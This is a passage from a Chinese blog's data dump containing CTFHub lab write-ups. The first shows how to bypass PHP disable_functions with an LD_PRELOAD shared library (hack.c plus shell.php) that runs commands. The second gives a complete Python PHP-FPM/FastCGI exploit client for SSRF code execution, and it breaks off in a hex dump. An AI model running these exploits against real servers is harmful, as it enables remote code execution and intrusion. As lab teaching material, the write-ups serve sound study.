利用条件\n\nphp.ini配置如下：\n\n```php\ndisable_functions=pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system\n```\n\n- linux系统\n- **putenv**未被禁用\n- **mail**或**error_log**至少需要有一个未被禁用\n- 存在可写目录，需要上传**.so**文件\n\n## 原理\n\n**mail**或**error_log**函数会调用**sendmail**，而**sendmail**会调用**geteuid**函数，所以将其重写覆盖即可达到目的。\n\n## 题目做法\n\nCTFHub中LD_PRELOAD题目环境给了**readflag**文件，即可直接调用\n\n创建**hack.c**文件\n\n```c\n#include <stdlib.h>\n#include <stdio.h>\n\nvoid payload() {\n\tsystem(\"/readflag > /tmp/flag\");\n}\n\nint getuid(){\n    if(getenv(\"LD_PRELOAD\") == NULL)\n        return 0;\n    unsetenv(\"LD_PRELOAD\");\n    payload();\n}\n```\n\n还有一种优化版本\n\n```c\n#include <stdio.h>\n#include <unistd.h>\n#include <stdlib.h>\n__attribute__ ((__constructor__)) void xxx (void){\n    unsetenv(\"LD_PRELOAD\");\n    system(\"/readflag > /tmp/flag\");\n}\n```\n\n用`gcc -fPIC -shared hack.c -o hack.so`编译出动态链接库**hack.so**文件\n\n上传到`/tmp/`目录下，一般来说`/tmp/`目录都是有读写权限的\n\n调用脚本：\n\nshell.php\n\n```php\n<?php\n  putenv(\"LD_PRELOAD=/tmp/hack.so\");\n  error_log(\"a\",1);\n  mail(\"a@localhost\",\"\",\"\",\"\",\"\");\n?>\n```\n\n利用 LD_PRELOAD 环境变量, 加载 hack.so, 在 hack.so 中执行命令.\n\n我们可以直接利用 hack.so 反弹 shell, 或者将输出重定向到文件当中\n\n> 参考\n>\n> [警惕UNIX下的LD_PRELOAD环境变量](https://blog.csdn.net/haoel/article/details/1602108)\n>\n> [LD_PRELOAD](https://writeup.ctfhub.com/Skill/Web%E8%BF%9B%E9%98%B6/PHP/Bypass-disable-function/74ASRSoQTq8x2VatRWJR7R.html)\n>\n> [AntSword-Labs](https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/1)\n\n","slug":"Bypass_disable_function","published":1,"updated":"2021-08-21T09:19:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cktfnuydg0009t8opdzrvcvwv","content":"<h1 id=\"LD-PRELOAD\"><a href=\"#LD-PRELOAD\" class=\"headerlink\" title=\"LD_PRELOAD\"></a>LD_PRELOAD</h1><h2 id=\"目的\"><a href=\"#目的\" class=\"headerlink\" title=\"目的\"></a>目的</h2><ul>\n<li>通过LD_PRELOAD方法绕过disabled_functions限制</li>\n</ul>\n<h2 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h2><p>绕过disabled_functions的四种手法</p>\n<ol>\n<li>攻击后端组件，寻找存在命令注入的web应用常用后端组件，如<strong>ImageMagick</strong>的魔图漏洞、<strong>bash</strong>的破壳漏洞等</li>\n<li>寻找未禁用的函数，常见命令执行的函数有<strong>system()</strong>、<strong>exec()</strong>、<strong>shell_exec()</strong>、<strong>passthru()</strong>，偏僻的<strong>popen()</strong>、<strong>proc_open()</strong>、<strong>pcntl_exec()</strong>等等，逐一尝试</li>\n<li>mod_cgi模式，尝试修改.htaccess，调整请求访问路由，绕过php.ini中的任何限制（让特定扩展名的文件直接和php-cgi通信）</li>\n<li>利用环境变量<strong>LD_PRELOAD</strong>劫持系统函数，让外部程序加载恶意*.so，达到执行系统命令的效果</li>\n</ol>\n<p>此处只详细说明第四种方法。大致步骤如下</p>\n<ul>\n<li>生成一个自己的恶意动态链接库文件</li>\n<li>利用<strong>putenv</strong>设置LD_PRELOAD为自己的恶意动态链接库文件的路径</li>\n<li>配合php的某个函数去触发自己的恶意动态链接库文件</li>\n<li>RCE并获取flag</li>\n</ul>\n<p>这里面的某个函数需要在运行的时候能够启动子进程，这样才能重新加载我们所设置的环境变量，从而劫持子进程所调用的库函数。</p>\n<h2 id=\"什么是LD-PRELOAD\"><a href=\"#什么是LD-PRELOAD\" class=\"headerlink\" title=\"什么是LD_PRELOAD\"></a>什么是LD_PRELOAD</h2><p>LD_PRELOAD是linux中的一个环境变量，它可以影响程序运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要用作有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或者更好的函数（无需别人的源码），而另一方面，我们也可以向别人的程序中注入恶意程序。</p>\n<h2 id=\"利用条件\"><a href=\"#利用条件\" class=\"headerlink\" title=\"利用条件\"></a>利用条件</h2><p>php.ini配置如下：</p>\n<pre class=\"line-numbers language-php\"><code class=\"language-php\">disable_functions<span class=\"token operator\">=</span>pcntl_alarm<span class=\"token punctuation\">,</span>pcntl_fork<span class=\"token punctuation\">,</span>pcntl_waitpid<span class=\"token punctuation\">,</span>pcntl_wait<span class=\"token punctuation\">,</span>pcntl_wifexited<span class=\"token punctuation\">,</span>pcntl_wifstopped<span class=\"token punctuation\">,</span>pcntl_wifsignaled<span class=\"token punctuation\">,</span>pcntl_wifcontinued<span class=\"token punctuation\">,</span>pcntl_wexitstatus<span class=\"token punctuation\">,</span>pcntl_wtermsig<span class=\"token punctuation\">,</span>pcntl_wstopsig<span class=\"token punctuation\">,</span>pcntl_signal<span class=\"token punctuation\">,</span>pcntl_signal_get_handler<span class=\"token punctuation\">,</span>pcntl_signal_dispatch<span class=\"token punctuation\">,</span>pcntl_get_last_error<span class=\"token punctuation\">,</span>pcntl_strerror<span class=\"token punctuation\">,</span>pcntl_sigprocmask<span class=\"token punctuation\">,</span>pcntl_sigwaitinfo<span class=\"token punctuation\">,</span>pcntl_sigtimedwait<span class=\"token punctuation\">,</span>pcntl_exec<span class=\"token punctuation\">,</span>pcntl_getpriority<span class=\"token punctuation\">,</span>pcntl_setpriority<span class=\"token punctuation\">,</span>pcntl_async_signals<span class=\"token punctuation\">,</span>exec<span class=\"token punctuation\">,</span>shell_exec<span class=\"token punctuation\">,</span>popen<span class=\"token punctuation\">,</span>proc_open<span class=\"token punctuation\">,</span>passthru<span class=\"token punctuation\">,</span>symlink<span class=\"token punctuation\">,</span>link<span class=\"token punctuation\">,</span>syslog<span class=\"token punctuation\">,</span>imap_open<span class=\"token punctuation\">,</span>dl<span class=\"token punctuation\">,</span>mail<span class=\"token punctuation\">,</span>system<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<ul>\n<li>linux系统</li>\n<li><strong>putenv</strong>未被禁用</li>\n<li><strong>mail</strong>或<strong>error_log</strong>至少需要有一个未被禁用</li>\n<li>存在可写目录，需要上传<strong>.so</strong>文件</li>\n</ul>\n<h2 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h2><p><strong>mail</strong>或<strong>error_log</strong>函数会调用<strong>sendmail</strong>，而<strong>sendmail</strong>会调用<strong>geteuid</strong>函数，所以将其重写覆盖即可达到目的。</p>\n<h2 id=\"题目做法\"><a href=\"#题目做法\" class=\"headerlink\" title=\"题目做法\"></a>题目做法</h2><p>CTFHub中LD_PRELOAD题目环境给了<strong>readflag</strong>文件，即可直接调用</p>\n<p>创建<strong>hack.c</strong>文件</p>\n<pre class=\"line-numbers language-c\"><code class=\"language-c\"><span class=\"token macro property\">#<span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token macro property\">#<span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">payload</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/readflag > /tmp/flag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">getuid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">getenv</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"LD_PRELOAD\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">unsetenv</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"LD_PRELOAD\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">payload</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>还有一种优化版本</p>\n<pre class=\"line-numbers language-c\"><code class=\"language-c\"><span class=\"token macro property\">#<span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\">#<span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span>\n<span class=\"token macro property\">#<span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token function\">__attribute__</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>__constructor__<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">void</span> <span class=\"token function\">xxx</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token function\">unsetenv</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"LD_PRELOAD\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/readflag > /tmp/flag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>用<code>gcc -fPIC -shared hack.c -o hack.so</code>编译出动态链接库<strong>hack.so</strong>文件</p>\n<p>上传到<code>/tmp/</code>目录下，一般来说<code>/tmp/</code>目录都是有读写权限的</p>\n<p>调用脚本：</p>\n<p>shell.php</p>\n<pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span>\n  <span class=\"token function\">putenv</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"LD_PRELOAD=/tmp/hack.so\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">error_log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">mail</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"a@localhost\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter\">?></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>利用 LD_PRELOAD 环境变量, 加载 hack.so, 在 hack.so 中执行命令.</p>\n<p>我们可以直接利用 hack.so 反弹 shell, 或者将输出重定向到文件当中</p>\n<blockquote>\n<p>参考</p>\n<p><a href=\"https://blog.csdn.net/haoel/article/details/1602108\" target=\"_blank\" rel=\"noopener\">警惕UNIX下的LD_PRELOAD环境变量</a></p>\n<p><a href=\"https://writeup.ctfhub.com/Skill/Web%E8%BF%9B%E9%98%B6/PHP/Bypass-disable-function/74ASRSoQTq8x2VatRWJR7R.html\" target=\"_blank\" rel=\"noopener\">LD_PRELOAD</a></p>\n<p><a href=\"https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/1\" target=\"_blank\" rel=\"noopener\">AntSword-Labs</a></p>\n</blockquote>\n","site":{"data":{"friends":[{"name":"知乎专栏","url":"https://zhuanlan.zhihu.com/godweiyang","title":"访问主页","introduction":"算法码上来","avatar":"/medias/avatars/myzhihu.png"}],"musics":[{"name":"夜曲","artist":"周杰伦","url":"/medias/music/yequ.mp3","cover":"/medias/music/avatars/yequ.jpg"},{"name":"一路向北","artist":"周杰伦","url":"/medias/music/yiluxiangbei.mp3","cover":"/medias/music/avatars/yiluxiangbei.jpg"},{"name":"来自天堂的魔鬼","artist":"邓紫棋","url":"/medias/music/tiantangdemogui.mp3","cover":"/medias/music/avatars/tiantangdemogui.jpg"},{"name":"倒数","artist":"邓紫棋","url":"/medias/music/daoshu.mp3","cover":"/medias/music/avatars/daoshu.jpg"}]}},"excerpt":"","more":"<h1 id=\"LD-PRELOAD\"><a href=\"#LD-PRELOAD\" class=\"headerlink\" title=\"LD_PRELOAD\"></a>LD_PRELOAD</h1><h2 id=\"目的\"><a href=\"#目的\" class=\"headerlink\" title=\"目的\"></a>目的</h2><ul>\n<li>通过LD_PRELOAD方法绕过disabled_functions限制</li>\n</ul>\n<h2 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h2><p>绕过disabled_functions的四种手法</p>\n<ol>\n<li>攻击后端组件，寻找存在命令注入的web应用常用后端组件，如<strong>ImageMagick</strong>的魔图漏洞、<strong>bash</strong>的破壳漏洞等</li>\n<li>寻找未禁用的函数，常见命令执行的函数有<strong>system()</strong>、<strong>exec()</strong>、<strong>shell_exec()</strong>、<strong>passthru()</strong>，偏僻的<strong>popen()</strong>、<strong>proc_open()</strong>、<strong>pcntl_exec()</strong>等等，逐一尝试</li>\n<li>mod_cgi模式，尝试修改.htaccess，调整请求访问路由，绕过php.ini中的任何限制（让特定扩展名的文件直接和php-cgi通信）</li>\n<li>利用环境变量<strong>LD_PRELOAD</strong>劫持系统函数，让外部程序加载恶意*.so，达到执行系统命令的效果</li>\n</ol>\n<p>此处只详细说明第四种方法。大致步骤如下</p>\n<ul>\n<li>生成一个自己的恶意动态链接库文件</li>\n<li>利用<strong>putenv</strong>设置LD_PRELOAD为自己的恶意动态链接库文件的路径</li>\n<li>配合php的某个函数去触发自己的恶意动态链接库文件</li>\n<li>RCE并获取flag</li>\n</ul>\n<p>这里面的某个函数需要在运行的时候能够启动子进程，这样才能重新加载我们所设置的环境变量，从而劫持子进程所调用的库函数。</p>\n<h2 id=\"什么是LD-PRELOAD\"><a href=\"#什么是LD-PRELOAD\" class=\"headerlink\" title=\"什么是LD_PRELOAD\"></a>什么是LD_PRELOAD</h2><p>LD_PRELOAD是linux中的一个环境变量，它可以影响程序运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要用作有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或者更好的函数（无需别人的源码），而另一方面，我们也可以向别人的程序中注入恶意程序。</p>\n<h2 id=\"利用条件\"><a href=\"#利用条件\" class=\"headerlink\" title=\"利用条件\"></a>利用条件</h2><p>php.ini配置如下：</p>\n<pre><code class=\"php\">disable_functions=pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system</code></pre>\n<ul>\n<li>linux系统</li>\n<li><strong>putenv</strong>未被禁用</li>\n<li><strong>mail</strong>或<strong>error_log</strong>至少需要有一个未被禁用</li>\n<li>存在可写目录，需要上传<strong>.so</strong>文件</li>\n</ul>\n<h2 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h2><p><strong>mail</strong>或<strong>error_log</strong>函数会调用<strong>sendmail</strong>，而<strong>sendmail</strong>会调用<strong>geteuid</strong>函数，所以将其重写覆盖即可达到目的。</p>\n<h2 id=\"题目做法\"><a href=\"#题目做法\" class=\"headerlink\" title=\"题目做法\"></a>题目做法</h2><p>CTFHub中LD_PRELOAD题目环境给了<strong>readflag</strong>文件，即可直接调用</p>\n<p>创建<strong>hack.c</strong>文件</p>\n<pre><code class=\"c\">#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n\nvoid payload() {\n    system(&quot;/readflag &gt; /tmp/flag&quot;);\n}\n\nint getuid(){\n    if(getenv(&quot;LD_PRELOAD&quot;) == NULL)\n        return 0;\n    unsetenv(&quot;LD_PRELOAD&quot;);\n    payload();\n}</code></pre>\n<p>还有一种优化版本</p>\n<pre><code class=\"c\">#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;stdlib.h&gt;\n__attribute__ ((__constructor__)) void xxx (void){\n    unsetenv(&quot;LD_PRELOAD&quot;);\n    system(&quot;/readflag &gt; /tmp/flag&quot;);\n}</code></pre>\n<p>用<code>gcc -fPIC -shared hack.c -o hack.so</code>编译出动态链接库<strong>hack.so</strong>文件</p>\n<p>上传到<code>/tmp/</code>目录下，一般来说<code>/tmp/</code>目录都是有读写权限的</p>\n<p>调用脚本：</p>\n<p>shell.php</p>\n<pre><code class=\"php\">&lt;?php\n  putenv(&quot;LD_PRELOAD=/tmp/hack.so&quot;);\n  error_log(&quot;a&quot;,1);\n  mail(&quot;a@localhost&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);\n?&gt;</code></pre>\n<p>利用 LD_PRELOAD 环境变量, 加载 hack.so, 在 hack.so 中执行命令.</p>\n<p>我们可以直接利用 hack.so 反弹 shell, 或者将输出重定向到文件当中</p>\n<blockquote>\n<p>参考</p>\n<p><a href=\"https://blog.csdn.net/haoel/article/details/1602108\" target=\"_blank\" rel=\"noopener\">警惕UNIX下的LD_PRELOAD环境变量</a></p>\n<p><a href=\"https://writeup.ctfhub.com/Skill/Web%E8%BF%9B%E9%98%B6/PHP/Bypass-disable-function/74ASRSoQTq8x2VatRWJR7R.html\" target=\"_blank\" rel=\"noopener\">LD_PRELOAD</a></p>\n<p><a href=\"https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/1\" target=\"_blank\" rel=\"noopener\">AntSword-Labs</a></p>\n</blockquote>\n"},{"title":"CTFHub中关于FastCGI协议的SSRF","date":"2021-09-10T06:01:08.826Z","top":false,"cover":false,"password":null,"toc":true,"mathjax":true,"summary":null,"_content":"\n\n\n# 解题步骤\n\n1. 监听9000端口，因为PHP-FPM默认监听9000端口\n\n   ![image-20210719051814927](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210719051814927.png)\n\n   exp如下：\n\n   ```python\n   #ssrf_fastcgi_fpm.py\n   import socket\n   import random\n   import argparse\n   import sys\n   from io import BytesIO\n   \n   # Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client\n   \n   PY2 = True if sys.version_info.major == 2 else False\n   \n   \n   def bchr(i):\n       if PY2:\n           return force_bytes(chr(i))\n       else:\n           return bytes([i])\n   \n   def bord(c):\n       if isinstance(c, int):\n           return c\n       else:\n           return ord(c)\n   \n   def force_bytes(s):\n       if isinstance(s, bytes):\n           return s\n       else:\n           return s.encode('utf-8', 'strict')\n   \n   def force_text(s):\n       if issubclass(type(s), str):\n           return s\n       if isinstance(s, bytes):\n           s = str(s, 'utf-8', 'strict')\n       else:\n           s = str(s)\n       return s\n   \n   \n   class FastCGIClient:\n       \"\"\"A Fast-CGI Client for Python\"\"\"\n   \n       # private\n       __FCGI_VERSION = 1\n   \n       __FCGI_ROLE_RESPONDER = 1\n       __FCGI_ROLE_AUTHORIZER = 2\n       __FCGI_ROLE_FILTER = 3\n   \n       __FCGI_TYPE_BEGIN = 1\n       __FCGI_TYPE_ABORT = 2\n       __FCGI_TYPE_END = 3\n       __FCGI_TYPE_PARAMS = 4\n       __FCGI_TYPE_STDIN = 5\n       __FCGI_TYPE_STDOUT = 6\n       __FCGI_TYPE_STDERR = 7\n       __FCGI_TYPE_DATA = 8\n       __FCGI_TYPE_GETVALUES = 9\n       __FCGI_TYPE_GETVALUES_RESULT = 10\n       __FCGI_TYPE_UNKOWNTYPE = 11\n   \n       __FCGI_HEADER_SIZE = 8\n   \n       # request state\n       FCGI_STATE_SEND = 1\n       FCGI_STATE_ERROR = 2\n       FCGI_STATE_SUCCESS = 3\n   \n       def __init__(self, host, port, timeout, keepalive):\n           self.host = host\n           self.port = port\n           self.timeout = timeout\n           if keepalive:\n               self.keepalive = 1\n           else:\n               self.keepalive = 0\n           self.sock = None\n           self.requests = dict()\n   \n       def __connect(self):\n           self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n           self.sock.settimeout(self.timeout)\n           self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n           # if self.keepalive:\n           #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)\n           # else:\n           #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)\n           try:\n               self.sock.connect((self.host, int(self.port)))\n           except socket.error as msg:\n               self.sock.close()\n               self.sock = None\n               print(repr(msg))\n               return False\n           return True\n   \n       def __encodeFastCGIRecord(self, fcgi_type, content, requestid):\n           length = len(content)\n           buf = bchr(FastCGIClient.__FCGI_VERSION) \\\n                  + bchr(fcgi_type) \\\n                  + bchr((requestid >> 8) & 0xFF) \\\n                  + bchr(requestid & 0xFF) \\\n                  + bchr((length >> 8) & 0xFF) \\\n                  + bchr(length & 0xFF) \\\n                  + bchr(0) \\\n                  + bchr(0) \\\n                  + content\n           return buf\n   \n       def __encodeNameValueParams(self, name, value):\n           nLen = len(name)\n           vLen = len(value)\n           record = b''\n           if nLen < 128:\n               record += bchr(nLen)\n           else:\n               record += bchr((nLen >> 24) | 0x80) \\\n                         + bchr((nLen >> 16) & 0xFF) \\\n                         + bchr((nLen >> 8) & 0xFF) \\\n                         + bchr(nLen & 0xFF)\n           if vLen < 128:\n               record += bchr(vLen)\n           else:\n               record += bchr((vLen >> 24) | 0x80) \\\n                         + bchr((vLen >> 16) & 0xFF) \\\n                         + bchr((vLen >> 8) & 0xFF) \\\n                         + bchr(vLen & 0xFF)\n           return record + name + value\n   \n       def __decodeFastCGIHeader(self, stream):\n           header = dict()\n           header['version'] = bord(stream[0])\n           header['type'] = bord(stream[1])\n           header['requestId'] = (bord(stream[2]) << 8) + bord(stream[3])\n           header['contentLength'] = (bord(stream[4]) << 8) + bord(stream[5])\n           header['paddingLength'] = bord(stream[6])\n           header['reserved'] = bord(stream[7])\n           return header\n   \n       def __decodeFastCGIRecord(self, buffer):\n           header = buffer.read(int(self.__FCGI_HEADER_SIZE))\n   \n           if not header:\n               return False\n           else:\n               record = self.__decodeFastCGIHeader(header)\n               record['content'] = b''\n   \n               if 'contentLength' in record.keys():\n                   contentLength = int(record['contentLength'])\n                   record['content'] += buffer.read(contentLength)\n               if 'paddingLength' in record.keys():\n                   skiped = buffer.read(int(record['paddingLength']))\n               return record\n   \n       def request(self, nameValuePairs={}, post=''):\n           if not self.__connect():\n               print('connect failure! please check your fasctcgi-server !!')\n               return\n   \n           requestId = random.randint(1, (1 << 16) - 1)\n           self.requests[requestId] = dict()\n           request = b\"\"\n           beginFCGIRecordContent = bchr(0) \\\n                                    + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\\n                                    + bchr(self.keepalive) \\\n                                    + bchr(0) * 5\n           request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,\n                                                 beginFCGIRecordContent, requestId)\n           paramsRecord = b''\n           if nameValuePairs:\n               for (name, value) in nameValuePairs.items():\n                   name = force_bytes(name)\n                   value = force_bytes(value)\n                   paramsRecord += self.__encodeNameValueParams(name, value)\n   \n           if paramsRecord:\n               request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)\n           request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)\n   \n           if post:\n               request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)\n           request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)\n   \n           self.sock.send(request)\n           self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND\n           self.requests[requestId]['response'] = b''\n           return self.__waitForResponse(requestId)\n   \n       def __waitForResponse(self, requestId):\n           data = b''\n           while True:\n               buf = self.sock.recv(512)\n               if not len(buf):\n                   break\n               data += buf\n   \n           data = BytesIO(data)\n           while True:\n               response = self.__decodeFastCGIRecord(data)\n               if not response:\n                   break\n               if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \\\n                       or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:\n                   if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:\n                       self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR\n                   if requestId == int(response['requestId']):\n                       self.requests[requestId]['response'] += response['content']\n               if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS:\n                   self.requests[requestId]\n           return self.requests[requestId]['response']\n   \n       def __repr__(self):\n           return \"fastcgi connect host:{} port:{}\".format(self.host, self.port)\n   \n   \n   if __name__ == '__main__':\n       parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.')\n       parser.add_argument('host', help='Target host, such as 127.0.0.1')\n       parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php')\n       parser.add_argument('-c', '--code', help='What php code your want to execute', default='<?php phpinfo(); exit; ?>')\n       parser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int)\n   \n       args = parser.parse_args()\n   \n       client = FastCGIClient(args.host, args.port, 3, 0)\n       params = dict()\n       documentRoot = \"/\"\n       uri = args.file\n       content = args.code\n       params = {\n           'GATEWAY_INTERFACE': 'FastCGI/1.0',\n           'REQUEST_METHOD': 'POST',\n           'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),\n           'SCRIPT_NAME': uri,\n           'QUERY_STRING': '',\n           'REQUEST_URI': uri,\n           'DOCUMENT_ROOT': documentRoot,\n           'SERVER_SOFTWARE': 'php/fcgiclient',\n           'REMOTE_ADDR': '127.0.0.1',\n           'REMOTE_PORT': '9985',\n           'SERVER_ADDR': '127.0.0.1',\n           'SERVER_PORT': '80',\n           'SERVER_NAME': \"localhost\",\n           'SERVER_PROTOCOL': 'HTTP/1.1',\n           'CONTENT_TYPE': 'application/text',\n           'CONTENT_LENGTH': \"%d\" % len(content),\n           'PHP_VALUE': 'auto_prepend_file = php://input',\n           'PHP_ADMIN_VALUE': 'allow_url_include = On'\n       }\n       response = client.request(params, content)\n   \n   ```\n\n   以`py fpm.py -c [php语句] -p port host path `格式执行即可\n\n2. 首先执行`ls /`命令\n\n   ```bash\n   python ssrf_fastcgi_fpm.py -c \"<?php var_dump(shell_exec('ls /'));?>\" -p 9000 127.0.0.1 /usr/local/lib/php/PEAR.php\n   ```\n\n   得到利用exp获得的攻击流量1.txt，用010editor打开![image-20210719052340479](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210719052340479.png)\n\n   以十六进制文本的形式复制下来，用以下脚本进行url编码\n\n   ```python\n   a='''\n   01 01 11 C4 00 08 00 00 00 01 00 00 00 00 00 00\n   01 04 11 C4 01 E7 00 00 11 0B 47 41 54 45 57 41\n   59 5F 49 4E 54 45 52 46 41 43 45 46 61 73 74 43\n   47 49 2F 31 2E 30 0E 04 52 45 51 55 45 53 54 5F\n   4D 45 54 48 4F 44 50 4F 53 54 0F 1B 53 43 52 49\n   50 54 5F 46 49 4C 45 4E 41 4D 45 2F 75 73 72 2F\n   6C 6F 63 61 6C 2F 6C 69 62 2F 70 68 70 2F 50 45\n   41 52 2E 70 68 70 0B 1B 53 43 52 49 50 54 5F 4E\n   41 4D 45 2F 75 73 72 2F 6C 6F 63 61 6C 2F 6C 69\n   62 2F 70 68 70 2F 50 45 41 52 2E 70 68 70 0C 00\n   51 55 45 52 59 5F 53 54 52 49 4E 47 0B 1B 52 45\n   51 55 45 53 54 5F 55 52 49 2F 75 73 72 2F 6C 6F\n   63 61 6C 2F 6C 69 62 2F 70 68 70 2F 50 45 41 52\n   2E 70 68 70 0D 01 44 4F 43 55 4D 45 4E 54 5F 52\n   4F 4F 54 2F 0F 0E 53 45 52 56 45 52 5F 53 4F 46\n   54 